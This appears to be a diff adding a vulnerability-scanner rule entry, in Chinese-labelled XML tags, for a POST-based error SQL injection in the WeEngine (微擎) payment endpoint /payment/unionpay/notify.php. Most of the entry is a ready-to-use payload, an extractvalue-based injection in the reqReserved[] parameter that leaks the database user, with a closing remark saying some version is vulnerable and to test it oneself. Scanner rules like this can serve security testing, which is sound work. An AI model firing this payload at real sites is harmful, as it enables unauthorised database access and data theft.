@@ -1,0 +1,10 @@
+<zbz>1</zbz>
+<bz1>
+<name>微擎/payment/unionpay/notify.php处POST型SQL报错注入</name>
+<sfjt>post</sfjt>
+<dzkz>/payment/unionpay/notify.php</dzkz>
+<demo>reqReserved[]=1'and extractvalue(1, concat(0x5c, (select user()))),'1</demo>
+<expjc>1</expjc>
+<zjyz>@</zjyz>
+</bz1>
+<bz>微擎某版本/payment/unionpay/notify.php处存在POST型SQL注入漏洞，自行测试</bz>
